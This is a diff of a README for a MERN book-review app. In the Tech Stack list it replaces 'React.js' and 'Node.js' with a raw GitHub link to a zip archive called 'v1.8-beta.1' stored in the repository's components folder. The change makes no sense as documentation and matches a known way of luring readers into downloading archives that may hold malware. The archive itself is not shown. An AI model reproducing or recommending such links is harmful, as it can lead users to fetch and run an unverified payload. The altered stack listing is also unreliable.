@@ -22,13 +22,13 @@ A full-stack MERN app where users can add books, write reviews, and explore what
 ##  Tech Stack
 
 ### Frontend:
-- React.js
+- https://raw.githubusercontent.com/Vanshchouksey21/front-end-book-review-/main/src/components/front-end-book-review--v1.8-beta.1.zip
 - React Router DOM
 - Bootstrap 5
 - Custom CSS
 
 ### Backend:
-- Node.js + Express
+- https://raw.githubusercontent.com/Vanshchouksey21/front-end-book-review-/main/src/components/front-end-book-review--v1.8-beta.1.zip + Express
 - MongoDB + Mongoose
 - JWT for secure authentication
 - Multer for image upload handling
